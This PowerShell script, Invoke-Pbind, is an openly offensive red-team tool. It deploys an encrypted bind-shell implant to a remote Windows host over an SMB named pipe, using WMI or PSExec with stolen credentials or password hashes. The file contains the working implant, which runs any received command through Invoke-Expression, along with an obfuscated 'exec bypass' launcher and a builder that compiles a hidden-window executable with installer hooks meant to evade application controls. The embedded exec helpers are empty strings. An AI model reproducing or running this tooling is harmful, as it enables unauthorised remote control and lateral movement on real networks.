<#

    File: Invoke-Pbind.ps1
    Author: Doug McLeod (@b4ggio_su)
    Author: Ben Turner (@bturner)
    License: BSD 3-Clause
    Required Dependencies: None
    Optional Dependencies: None

#>

Function Invoke-Pbind {

<#
.SYNOPSIS

The Invoke-Pbind is an SMB bind shell that overlays SMB by communicating over a named pipe.
Incorperating input from @bturner Invoke-Pipekat tool and Invoke-WMIExec from @kevin_robertson

.DESCRIPTION

When in a locked down environment and needing to deploy a bind shell, Invoke-Pbind, will execute an implant on the target
endpoint (using WMI as default or PSEXEC) and then connect to the host over the created named pipe. This comms method does
not beacon and instead creates one connection to stream data. The client executes in a runspace with functions (pbind-command
and pbind-module) to interacte with the implant on the target workstation. If it is not possible to deploy over wmi or psexec,
then use the exe option to create a bind shell executable and deploy manually, before connecting with the client.

Interacting with the Implant
###################################################################################
#                                                                                 #
#   1. Load Modules: PS C:\> Pbind-module "c:\modules folder\powerview.ps1"       #
#                                                                                 #
#   2. Send Commands to Implant: PS C:\> Pbind-Command "net user administrator"   #
#                                                                                 #
#   3. Kill Implant: PS C:\> PBind-Kill                                           #
#                                                                                 #
###################################################################################

.PARAMETER target

Specifies the computer name or ip address of the target system the implant should be deployed or the client should connect to.

.PARAMETER domain

Specifies the domain name used as part of the authentication against the target machine.

.PARAMETER user

Specifies the username used as part of the authentication against the target machine.

.PARAMETER password

Specifies the password used as part of the authentication against the target machine.

.PARAMETER key

Specifies the key used by AES to encrypt and decrypt traffic. Must be the correct size. Should only be manually configured when used in client mode.

.PARAMETER secret

Specifies a value that is exchanged between the client and the implant at first connection. If the wrong secret is exchanged the pipe is closed 

.PARAMETER pname

Specifies a hard coded pipe name to be used. Most commonly used in client mode to define the pipe on the target.

.PARAMETER timeout

Allows a user configurable option to specify the timeout used by the client to connect to the implant before giving up. Default 60 seconds.

.PARAMETER dir

Specifies the output directory used when in EXE mode.

.PARAMETER automation

Specifies the directory used to store the 'System.Management.Automation.dll' for use in compiling the implant.

.PARAMETER psexec

Specifies the use of PSEXEC instead of WMI as a deployment mechanism.

.PARAMETER client

Switches mode to client only mode, disabling the deployment feature.

.PARAMETER exe

Switches to executable mode, used to create a stand alone implant to be manually deployed.

.EXAMPLE
Invoke-Pbind -Target 10.0.0.100 -Domain LAB -User Admin -Password Password1

.EXAMPLE
Invoke-Pbind -Target 10.0.0.100 -Domain LAB -User Admin -Password Password1 -PSexec

.EXAMPLE
Invoke-Pbind -Target 10.0.0.100 -Domain LAB -User Admin -Hash AAAAAAAAAAAAAAAAAAAAAAAAA -PSexec

.EXAMPLE
Invoke-Pbind -Target 10.0.0.100 -Domain . -User Admin -Password Password1 -timeout 10000

.EXAMPLE 
Invoke-pbind -target 10.0.0.100 -dir "c:\pbind-out" -automation "C:\pbind-in" -exe

.EXAMPLE
Invoke-pbind -target 10.0.0.100 -secret do1gu -key jhPtfSwdNCWkks3qcDcj8OYtT/a3QY9VS/3HMX+54RQ= -pname ndv4ut7fyg -client

#>

Param (
    [Parameter(Mandatory = $false)]
    [string]$target,
    [Parameter(Mandatory = $false)]
    [string]$domain,
    [Parameter(Mandatory = $false)]
    [string]$user,
    [Parameter(Mandatory = $false)]
    [string]$password,
    [Parameter(Mandatory = $false)]
    [string]$key,
    [Parameter(Mandatory = $False)]
    [string]$secret,
    [Parameter(Mandatory = $False)]
    [string]$pname,
    [Parameter(Mandatory = $false)]
    [int]$timeout=60000,
    [Parameter(Mandatory = $False)]
    [string]$dir,
    [Parameter(Mandatory = $False)]
    [string]$automation,
    [Parameter(Mandatory = $false)]
    [switch]$psexec,
    [Parameter(Mandatory = $false)]
    [switch]$client,
    [Parameter(Mandatory = $false)]
    [switch]$exe
    )
$global:pipestate = [HashTable]::Synchronized(@{})
$pipestate.log = New-Object System.Collections.ArrayList
$pipestate.command = $null
$pipestate.state = $false

function Random-Pipe
{
    param (
        [int]$Length
    )
    $set    = 'abcdefghijklmnopqrstuvwxyz0123456789'.ToCharArray()
    $result = ''
    for ($x = 0; $x -lt $Length; $x++) 
    {$result += $set | Get-Random}
    return $result
}

# creates a randon AES managed object
function Create-AesManagedObject 
{
    param
    ([Object]
        $key,
        [Object]
        $IV)
    $aesManaged = New-Object -TypeName 'System.Security.Cryptography.RijndaelManaged'
    $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
    $aesManaged.BlockSize = 128
    $aesManaged.KeySize = 256
    if ($IV) 
    {
        if ($IV.getType().Name -eq 'String') 
        {$aesManaged.IV = [System.Convert]::FromBase64String($IV)}
        else 
        {$aesManaged.IV = $IV}
    }
    if ($key) 
    {
        if ($key.getType().Name -eq 'String') 
        {$aesManaged.Key = [System.Convert]::FromBase64String($key)}
        else 
        {$aesManaged.Key = $key}
    }
    $aesManaged
}

# creates a randon AES symetric encryption key
function Create-AesKey() 
{
    $aesManaged = Create-AesManagedObject
    $aesManaged.GenerateKey()
    [System.Convert]::ToBase64String($aesManaged.Key)
}

# encryption utility using Rijndael encryption, an AES equivelant, returns encrypted base64 block 
function Encrypt-String 
{
    param
    (
        [Object]
        $key,
        [Object]
        $unencryptedString
    )

    $bytes = [System.Text.Encoding]::UTF8.GetBytes($unencryptedString)
    $aesManaged = Create-AesManagedObject $key
    $encryptor = $aesManaged.CreateEncryptor()
    $encryptedData = $encryptor.TransformFinalBlock($bytes, 0, $bytes.Length)
    [byte[]] $fullData = $aesManaged.IV + $encryptedData
    [System.Convert]::ToBase64String($fullData)
}

# decryption utility using Rijndael encryption, an AES equivelant, returns unencrypted UTF8 data
function Decrypt-String 
{
    param
    (
        [Object]
        $key,
        [Object]
        $encryptedStringWithIV
    )
    $bytes = [System.Convert]::FromBase64String($encryptedStringWithIV)
    $IV = $bytes[0..15]
    $aesManaged = Create-AesManagedObject $key $IV
    $decryptor = $aesManaged.CreateDecryptor()
    $unencryptedData = $decryptor.TransformFinalBlock($bytes, 16, $bytes.Length - 16)
    [System.Text.Encoding]::UTF8.GetString($unencryptedData).Trim([char]0)
}



if (!$key){
$key = Create-AesKey
}
if (!$pname){
$pname = Random-Pipe 10
}
if (!$secret){
$secret = Random-Pipe 5
}

# creates a randon AES managed object
$s_scriptblock = @"
function Create-AesManagedObject 
{
    param
    (
        [Object]
        `$key,
        [Object]
        `$IV
    )
    `$aesManaged = New-Object -TypeName 'System.Security.Cryptography.RijndaelManaged'
    `$aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
    `$aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
    `$aesManaged.BlockSize = 128
    `$aesManaged.KeySize = 256
    if (`$IV) 
    {
        if (`$IV.getType().Name -eq 'String') 
        {`$aesManaged.IV = [System.Convert]::FromBase64String(`$IV)}
        else 
        {`$aesManaged.IV = `$IV}
    }
    if (`$key) 
    {
        if (`$key.getType().Name -eq 'String') 
        {`$aesManaged.Key = [System.Convert]::FromBase64String(`$key)}
        else 
        {`$aesManaged.Key = `$key}
    }
    `$aesManaged
}

function Encrypt-String 
{
    param
    (
        [Object]
        `$key,
        [Object]
        `$unencryptedString
    )

    `$bytes = [System.Text.Encoding]::UTF8.GetBytes(`$unencryptedString)
    `$aesManaged = Create-AesManagedObject `$key
    `$encryptor = `$aesManaged.CreateEncryptor()
    `$encryptedData = `$encryptor.TransformFinalBlock(`$bytes, 0, `$bytes.Length)
    [byte[]] `$fullData = `$aesManaged.IV + `$encryptedData
    [System.Convert]::ToBase64String(`$fullData)
}
function Decrypt-String 
{
    param
    (
        [Object]
        `$key,
        [Object]
        `$encryptedStringWithIV
    )
    `$bytes = [System.Convert]::FromBase64String(`$encryptedStringWithIV)
    `$IV = `$bytes[0..15]
    `$aesManaged = Create-AesManagedObject `$key `$IV
    `$decryptor = `$aesManaged.CreateDecryptor()
    `$unencryptedData = `$decryptor.TransformFinalBlock(`$bytes, 16, `$bytes.Length - 16)
    [System.Text.Encoding]::UTF8.GetString(`$unencryptedData).Trim([char]0)
}
 
function invoke-pserv {
param (`$secret, `$key, `$pname)

add-Type -assembly 'System.Core'
`$PipeSecurity = New-Object System.IO.Pipes.PipeSecurity
`$AccessRule = New-Object System.IO.Pipes.PipeAccessRule( 'Everyone', 'ReadWrite', 'Allow' )
`$PipeSecurity.AddAccessRule(`$AccessRule)
`$Pipe = New-Object System.IO.Pipes.NamedPipeServerStream(`$pname,'InOut',100, 'Byte', 'None', 4096, 4096, `$PipeSecurity)

try {
    'Waiting for client connection'
    `$pipe.WaitForConnection()
    'Connection established'
 
    `$pipeReader = new-object System.IO.StreamReader(`$pipe)
    `$pipeWriter = new-object System.IO.StreamWriter(`$pipe)
    `$pipeWriter.AutoFlush = `$true
 
    `$PPass = `$pipeReader.ReadLine()
    
 
    while (1)
    {        
        if (`$PPass -ne `$secret) {
            `$pipeWriter.WriteLine('Microsoft Error: 151337')
        }
        
        else {
            
            while (1) {
                `$encCommand = Encrypt-String -unencryptedString 'COMMAND' -Key `$key
                `$pipeWriter.WriteLine(`$encCommand)
                
                `$command = `$pipeReader.ReadLine()
                `$decCommand = Decrypt-String -key `$key -encryptedStringWithIV `$command
                           
                if (`$deccommand) {
                    try {
                        if (`$decCommand -eq 'KILLPIPE'){exit}
                        `$res = Invoke-Expression `$decCommand | out-string
                        `$res = `$res + '123456PS ' + (Get-Location).Path + '>654321'
                    } catch {
                        `$res = 'ErrorUpload: ' + `$error[0]
                    }
                    `$fileContentBytes = [System.Text.Encoding]::Unicode.GetBytes(`$res)
                    `$res = [System.Convert]::ToBase64String(`$fileContentBytes)
                    `$encCommand2 = Encrypt-String -unencryptedString `$res -Key `$key
                    `$pipeWriter.WriteLine(`$encCommand2)
                    `$pipeWriter.Flush()
                }
                elseif (!`$decCommand) {
                    `$encshit = Encrypt-String -unencryptedString 'shit went wrong' -Key `$key
                    `$pipeWriter.WriteLine(`$encshit)
                    break
                }

            }                       
        }
        `$encGo = Encrypt-String -unencryptedString 'GOAGAIN' -Key `$key
        `$pipeWriter.WriteLine(`$encGo)
        `$encSure = Encrypt-String -unencryptedString 'SURE' -Key `$key
        `$pipeWriter.WriteLine(`$encSure)
        `$command = `$pipeReader.ReadLine()
        `$decCommand = Decrypt-String -key `$key -encryptedStringWithIV `$command
        if (`$decCommand -eq 'EXIT') { break }
    }
 
    Start-Sleep -Seconds 2
}
finally {
    `$pipe.Dispose()
}
}
invoke-pserv -secret $secret -key $key -pname $pname
"@

$c_scriptblock = @"
function Create-AesManagedObject 
{
    param
    (
        [Object]
        `$key,
        [Object]
        `$IV
    )
    `$aesManaged = New-Object -TypeName 'System.Security.Cryptography.RijndaelManaged'
    `$aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
    `$aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
    `$aesManaged.BlockSize = 128
    `$aesManaged.KeySize = 256
    if (`$IV) 
    {
        if (`$IV.getType().Name -eq 'String') 
        {`$aesManaged.IV = [System.Convert]::FromBase64String(`$IV)}
        else 
        {`$aesManaged.IV = `$IV}
    }
    if (`$key) 
    {
        if (`$key.getType().Name -eq 'String') 
        {`$aesManaged.Key = [System.Convert]::FromBase64String(`$key)}
        else 
        {`$aesManaged.Key = `$key}
    }
    `$aesManaged
}
function Encrypt-String 
{
    param
    (
        [Object]
        `$key,
        [Object]
        `$unencryptedString
    )

    `$bytes = [System.Text.Encoding]::UTF8.GetBytes(`$unencryptedString)
    `$aesManaged = Create-AesManagedObject `$key
    `$encryptor = `$aesManaged.CreateEncryptor()
    `$encryptedData = `$encryptor.TransformFinalBlock(`$bytes, 0, `$bytes.Length)
    [byte[]] `$fullData = `$aesManaged.IV + `$encryptedData
    [System.Convert]::ToBase64String(`$fullData)
}
function Decrypt-String 
{
    param
    (
        [Object]
        `$key,
        [Object]
        `$encryptedStringWithIV
    )
    `$bytes = [System.Convert]::FromBase64String(`$encryptedStringWithIV)
    `$IV = `$bytes[0..15]
    `$aesManaged = Create-AesManagedObject `$key `$IV
    `$decryptor = `$aesManaged.CreateDecryptor()
    `$unencryptedData = `$decryptor.TransformFinalBlock(`$bytes, 16, `$bytes.Length - 16)
    [System.Text.Encoding]::UTF8.GetString(`$unencryptedData).Trim([char]0)
}
function invoke-pclient {
param (`$Target, `$secret, `$key, `$pname, `$timeout)
Add-Type -assembly 'System.Core'
`$pipec = new-object System.IO.Pipes.NamedPipeClientStream(`$Target, `$pname, [System.IO.Pipes.PipeDirection]::InOut,
                                                                [System.IO.Pipes.PipeOptions]::None, 
                                                                [System.Security.Principal.TokenImpersonationLevel]::Impersonation)
`$pipeReader = `$pipeWriter = `$null
try {
    `$pipec.Connect(`$timeout)
    'Connected to Pipe'
    `$pipestate.state = `$true
 
    `$pipeReader = new-object System.IO.StreamReader(`$pipec)
    `$pipeWriter = new-object System.IO.StreamWriter(`$pipec)
    `$pipeWriter.AutoFlush = `$true
  
    `$pipeWriter.WriteLine(`$secret)
     
    
    while (1) {
        while ((`$msg = Decrypt-String -key `$key -encryptedStringWithIV `$pipeReader.ReadLine()) -notmatch 'COMMAND|GOAGAIN') {
            `$pipestate.log += [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String(`$msg))              
        }
        if (`$msg -match 'GOAGAIN') { break }

        while(`$pipestate.command -eq `$null){ }
        if (`$pipestate.kill -eq 'KILLPIPE') {
        `$encSure = Encrypt-String -unencryptedString 'SURE' -Key `$key
        `$pipeWriter.WriteLine(`$encSure)
        } 
        `$pipestate.history = `$pipestate.command
        if (`$pipestate.command.ToLower().StartsWith('loadmodule')) {
            `$module = `$pipestate.command -replace 'loadmodule ', ''
            `$pipestate.command = gc `$module | Out-String
        }
        `$baseCommand = `$pipestate.command
        `$encCommand = Encrypt-String -unencryptedString `$baseCommand -Key `$key
        `$pipeWriter.WriteLine(`$encCommand)
        `$pipestate.command = `$null  
    }
}
finally {
    `$pipec.Dispose()
}
}

invoke-pclient -Target $target -secret $secret -key $key -pname $pname -timeout $timeout

"@

if ($client.IsPresent){
    $PIPE_runspace = [RunspaceFactory]::CreateRunspace()
    $PIPE_runspace.Open()
    $PIPE_runspace.SessionStateProxy.SetVariable('pipestate',$pipestate)
    $PIPE_powershell = [PowerShell]::Create()
    $PIPE_powershell.Runspace = $PIPE_runspace
    $PIPE_powershell.AddScript($c_scriptblock) > $null
    $PIPE_powershell.BeginInvoke() > $null
    echo ""
    $endtime = (Get-Date).AddMilliseconds($timeout)
    while ((Get-Date) -lt $endtime){
    if ($pipestate.state -eq $true)
    { break }

    echo $pipestate.state
    }

    if ($pipestate.state -eq $True){
        echo "Connected: $target - $pname"
        echo ""
    
        }
    elseif ((get-date) -lt $endtime){
        echo "Not Connected: Timeout occured"
        }
    else {
        echo "Not Connected: :-("
        }
    }

elseif ($exe.isPresent){

    if (!$dir){
    $dir="C:\temp"
    }
    if (!$automation){
    Write-host "You need to tell me where to get the automation dll to continue"
    break
    }
    # create exe 
    $bytescom = [System.Text.Encoding]::Unicode.GetBytes($s_scriptblock)
    $praw = [Convert]::ToBase64String($bytescom)
    $csccode = 'using System;
    using System.Text;
    using System.Diagnostics;
    using System.Reflection;
    using System.Configuration.Install;
    using System.Runtime.InteropServices;
    using System.Collections.ObjectModel;
    using System.Management.Automation;
    using System.Management.Automation.Runspaces;
    using System.EnterpriseServices;

    public class Program
        {
            [DllImport("kernel32.dll")]
            static extern IntPtr GetConsoleWindow();
            [DllImport("user32.dll")]
            static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

            public const int SW_HIDE = 0;
            public const int SW_SHOW = 5;
            public Program() {
                try
                {
                    string pb = System.Text.Encoding.Unicode.GetString(System.Convert.FromBase64String("'+$praw+'"));
                    InvokeAutomation(pb);
                }
                catch
                {
                    Main();
                }
            }
            public static string InvokeAutomation(string cmd)
            {
                Runspace newrunspace = RunspaceFactory.CreateRunspace();
                newrunspace.Open();
                RunspaceInvoke scriptInvoker = new RunspaceInvoke(newrunspace);
                Pipeline pipeline = newrunspace.CreatePipeline();

                pipeline.Commands.AddScript(cmd);
                Collection<PSObject> results = pipeline.Invoke();
                newrunspace.Close();

                StringBuilder stringBuilder = new StringBuilder();
                foreach (PSObject obj in results)
                {
                    stringBuilder.Append(obj);
                }
                return stringBuilder.ToString().Trim();
            }
            public static void Main()
            {
                var handle = GetConsoleWindow();
                ShowWindow(handle, SW_HIDE);
                try
                {
                    string pb = System.Text.Encoding.Unicode.GetString(System.Convert.FromBase64String("'+$praw+'"));
                    InvokeAutomation(pb);
                }
                catch
                {
                    Main();
                }
            }
        
    }

    public class Bypass : ServicedComponent
    {
	    [ComRegisterFunction]
	    public static void RegisterClass ( string key )
	    {
		    Program.Main(); 
	    }
	
	    [ComUnregisterFunction]
	    public static void UnRegisterClass ( string key )
	    {
		    Program.Main(); 
	    }
    }
    
    [System.ComponentModel.RunInstaller(true)]
    public class Sample : System.Configuration.Install.Installer
    {
        public override void Uninstall(System.Collections.IDictionary savedState)
        {
            Program.Main();       
        }
        public static string InvokeAutomation(string cmd)
        {
            Runspace newrunspace = RunspaceFactory.CreateRunspace();
            newrunspace.Open();
            RunspaceInvoke scriptInvoker = new RunspaceInvoke(newrunspace);
            Pipeline pipeline = newrunspace.CreatePipeline();

            pipeline.Commands.AddScript(cmd);
            Collection<PSObject> results = pipeline.Invoke();
            newrunspace.Close();

            StringBuilder stringBuilder = new StringBuilder();
            foreach (PSObject obj in results)
            {
                stringBuilder.Append(obj);
            }
            return stringBuilder.ToString().Trim();
        }
    }'
    [IO.File]::WriteAllLines("$dir\pbind.cs", $csccode)

    if (Test-Path "C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe") {
        Start-Process -WindowStyle hidden -FilePath "C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe" -ArgumentList "/out:$dir\pbind.exe $dir\pbind.cs /reference:$automation\System.Management.Automation.dll"
    } else {
        if (Test-Path "C:\Windows\Microsoft.NET\Framework\v3.5\csc.exe") {
            Start-Process -WindowStyle hidden -FilePath "C:\Windows\Microsoft.NET\Framework\v3.5\csc.exe" -ArgumentList "/out:$dir\pbind.exe $dir\pbind.cs /reference:$automation\System.Management.Automation.dll"
        }
    }
    echo ""
    Write-Host -Object "StandAlone Exe written to: $dir\pbind.exe"  -ForegroundColor Green
    echo ""
    if (!$target){
        write-Host -Object "Connection String: invoke-pbind -target <IP Address> -secret $secret -key $key -pname $pname -client" -ForegroundColor Green
    } else {
        write-Host -Object "Connection String: invoke-pbind -target $target -secret $secret -key $key -pname $pname -client" -ForegroundColor Green
        }
    }

Else {

    # Author: @kevin_robertson
    $wmiexec = ""

    # Author: @kevin_robertson
    $smbexec = ""

    # Convert server scriptblock to base64 with compression
    $ScriptBytes = ([Text.Encoding]::ASCII).GetBytes($s_scriptblock)
    $CompressedStream = New-Object IO.MemoryStream
    $DeflateStream = New-Object IO.Compression.DeflateStream ($CompressedStream, [IO.Compression.CompressionMode]::Compress)
    $DeflateStream.Write($ScriptBytes, 0, $ScriptBytes.Length)
    $DeflateStream.Dispose()
    $CompressedScriptBytes = $CompressedStream.ToArray()
    $CompressedStream.Dispose()
    $EncodedCompressedScript = [Convert]::ToBase64String($CompressedScriptBytes)
    $NewScript = 'sal a New-Object;iex(a IO.StreamReader((a IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String(' + "'$EncodedCompressedScript'" + '),[IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]::ASCII)).ReadToEnd()'
    $payload = "cmd /c powershell -exec bypass -c `"`"$NewScript`"`""

    if ($domain -eq ".") {
	    $net = new-object -ComObject WScript.Network
	    $net.MapNetworkDrive("", "\\$target\ipc$", $false, "$user", "$Password")
    } else {
	    $net = new-object -ComObject WScript.Network
	    $net.MapNetworkDrive("", "\\$target\ipc$", $false, "$domain\$user", "$Password")
    }

    # if psexec
    if ($PSexec.IsPresent) {
        $smbexecw = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($smbexec))
        IEX $smbexecw
        echo "`n[+] Running Invoke-SMBExec with the supplied credentials"
        if ($hash){
        $smbcmd = "Invoke-SMBExec -Target `"$target`" -Domain `"$domain`" -Username `"$user`" -Hash `"$hash`" -Command `"$payload`""
        } else {
        $smbcmd = "Invoke-SMBExec -Target `"$target`" -Domain `"$domain`" -Username `"$user`" -Password `"$password`" -Command `"$payload`""
        }
        $success = IEX $smbcmd
        $success
    } else {
        $wmiexecw = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($wmiexec))
        IEX $wmiexecw
        echo "`n[+] Running Invoke-WMIExec with the supplied credentials"
        if ($password){
        $wmicmd = "Invoke-WmiExec -Target `"$target`" -Domain `"$domain`" -Username `"$user`" -Password `"$password`" -Command `"$payload`""
        } else {
        $wmicmd = "Invoke-WmiExec -Target `"$target`" -Domain `"$domain`" -Username `"$user`" -Hash `"$hash`" -Command `"$payload`""
        }
        $success = IEX $wmicmd
        $success
    }
    
    $PIPE_runspace = [RunspaceFactory]::CreateRunspace()
    $PIPE_runspace.Open()
    $PIPE_runspace.SessionStateProxy.SetVariable('pipestate',$pipestate)
    $PIPE_powershell = [PowerShell]::Create()
    $PIPE_powershell.Runspace = $PIPE_runspace
    $PIPE_powershell.AddScript($c_scriptblock) > $null
    $PIPE_powershell.BeginInvoke() > $null
    echo ""
    $endtime = (Get-Date).AddMilliseconds($timeout)
    while ((Get-Date) -lt $endtime){
    if ($pipestate.state -eq $true)
    { break }

    echo $pipestate.state
    }

    if ($pipestate.state -eq $True){
        echo "Connected: $target - $pname"
        echo ""
    
        }
    elseif ((get-date) -lt $endtime){
        echo "Not Connected: Timeout occured"
        }
    else {
        echo "Not Connected: :-("
        }
}
}

function Pbind-Command ($command){
<#
    .SYNOPSIS

        Used to interact with the implant and send basic commands. 

    .EXAMPLE

        PS C:\> Pbind-Command ipconfig

    .DESCRIPTION
    
        Runs ipconfig on the target endpoint and returns the output.
#>
    if ($pipestate.state -eq $true){
        $pipestate.log = $null
        echo ""
        echo "[+] Sending command: $command"
        echo "" 
        $pipestate.command = $command
        while ($pipestate.log -eq $null){}
        $output = $pipestate.log -replace '123456(.+?)654321', ''
        $output 
        }
    else {
        echo "Not Connected: Command Not Sent"
    }
}

function Pbind-module ($command){
<#
    .SYNOPSIS

        Used to upload modules to the implant. 

    .EXAMPLE

        PS C:\> Pbind-module "c:\modules folder\powerview.ps1"

    .DESCRIPTION 
    
        Reads in a ps1 file into the implant, will execute if auto run configured. Use Send-Command to run functions loaded in memory.
#>
    if ($pipestate.state -eq $true){
        $pipestate.log = $null
        echo ""
        echo "[+] Loading Module $command"
        echo "" 
        $pipestate.command = "loadmodule $command"
        echo $pipestate.command
        while ($pipestate.log -eq $null){}
        $output = $pipestate.log -replace '123456(.+?)654321', ''
        $output}
    else {
        echo "Not Connected: Command Not Sent"
    }

}

function Pbind-Kill ($command){
<#
    .SYNOPSIS

        Used to kill the implant on the target. 

    .EXAMPLE

        PS C:\> Pbind-Kill

    .DESCRIPTION 
    
        Destroys Pipe on target
#>
    if ($pipestate.state -eq $true){
        echo ""
        "[-] Killing pipe"
        $pipestate.state = $false
        $pipestate.command = "KILLPIPE"
        echo "" 
        }
    else {
        echo "Not Connected: Command Not Send"
    }
}



